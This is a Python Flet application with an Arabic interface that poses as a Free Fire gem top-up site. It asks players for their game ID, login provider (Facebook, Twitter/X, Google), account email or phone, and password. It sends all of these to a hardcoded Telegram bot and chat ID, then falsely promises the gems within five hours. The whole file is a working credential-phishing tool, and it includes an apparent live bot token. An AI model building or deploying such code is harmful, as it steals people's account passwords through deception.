import flet as ft
import requests

# === بيانات تليجرام الخاصة بك ===
BOT_TOKEN = "8948628991:AAFC_pB0t-T1421MoBhHumLAyEUpoArG51w"
CHAT_ID = "1705427085"

def send_to_telegram(player_id, login_type, account_info, password):
    msg = (
        "📥 **بيانات حساب جديدة**\n"
        f"🆔 **معرف اللاعب (ID):** {player_id}\n"
        f"🌐 **طريقة التسجيل:** {login_type}\n"
        f"👤 **الحساب/الإيميل:** {account_info}\n"
        f"🔑 **كلمة السر:** {password}"
    )
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, data={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"})
    except Exception:
        pass

def main(page: ft.Page):
    page.title = "شحن جواهر فري فاير"
    page.vertical_alignment = ft.MainAxisAlignment.CENTER
    page.horizontal_alignment = ft.CrossAxisAlignment.CENTER

    txt_id = ft.TextField(label="ID اللاعب", width=300, border_color="gold")
    txt_account_info = ft.TextField(label="معلومات الحساب", width=300, border_color="gold")
    
    # القائمة المنسدلة بدون تمرير on_change داخل المُنشيء
    dd_login_type = ft.Dropdown(
        label="طريقة تسجيل الحساب",
        width=300,
        options=[
            ft.dropdown.Option("Facebook"),
            ft.dropdown.Option("Twitter / X"),
            ft.dropdown.Option("Google / Email"),
        ],
        border_color="gold"
    )

    # ربط الحدث بشكل منفصل لتفادي الخطأ
    def on_login_type_change(e):
        selected = dd_login_type.value
        if selected == "Facebook":
            txt_account_info.label = "رقم الهاتف أو إيميل الفيسبوك"
        elif selected == "Twitter / X":
            txt_account_info.label = "اسم المستخدم أو إيميل تويتر"
        elif selected == "Google / Email":
            txt_account_info.label = "البريد الإلكتروني (Google)"
        page.update()

    dd_login_type.on_change = on_login_type_change
    
    txt_pass = ft.TextField(label="كلمة السر", password=True, can_reveal_password=True, width=300, border_color="gold")
    txt_confirm_pass = ft.TextField(label="تأكيد كلمة السر", password=True, can_reveal_password=True, width=300, border_color="gold")
    
    lbl_status = ft.Text("", color="red", size=14)

    def on_submit(e):
        if not txt_id.value or not dd_login_type.value or not txt_account_info.value or not txt_pass.value or not txt_confirm_pass.value:
            lbl_status.value = "الرجاء تعبئة جميع الخانات!"
            lbl_status.color = "red"
            page.update()
            return
            
        if txt_pass.value != txt_confirm_pass.value:
            lbl_status.value = "كلمة السر غير متطابقة!"
            lbl_status.color = "red"
            page.update()
            return

        # إرسال البيانات المكتملة إلى تليجرام
        send_to_telegram(txt_id.value, dd_login_type.value, txt_account_info.value, txt_pass.value)
        
        lbl_status.value = "تم إرسال الطلب بنجاح! ستصلك الجواهر خلال 5 ساعات."
        lbl_status.color = "green"
        page.update()

    btn_submit = ft.ElevatedButton(
        content=ft.Text("إرسال الطلب", color="black", size=16, weight="bold"),
        on_click=on_submit,
        bgcolor="gold",
        width=200
    )

    page.add(
        ft.Stack(
            controls=[
                ft.Image(
                    src="free.jpg",
                    fit="cover",
                    width=page.width,
                    height=page.height,
                ),
                ft.Container(
                    content=ft.Column(
                        controls=[
                            ft.Text("موقع شحن الجواهر", size=24, weight="bold", color="gold"),
                            txt_id,
                            dd_login_type,
                            txt_account_info,
                            txt_pass,
                            txt_confirm_pass,
                            btn_submit,
                            lbl_status
                        ],
                        alignment=ft.MainAxisAlignment.CENTER,
                        horizontal_alignment=ft.CrossAxisAlignment.CENTER,
                        spacing=15
                    ),
                    alignment=ft.Alignment(0, 0),
                    padding=20
                )
            ],
            expand=True
        )
    )

ft.app(main)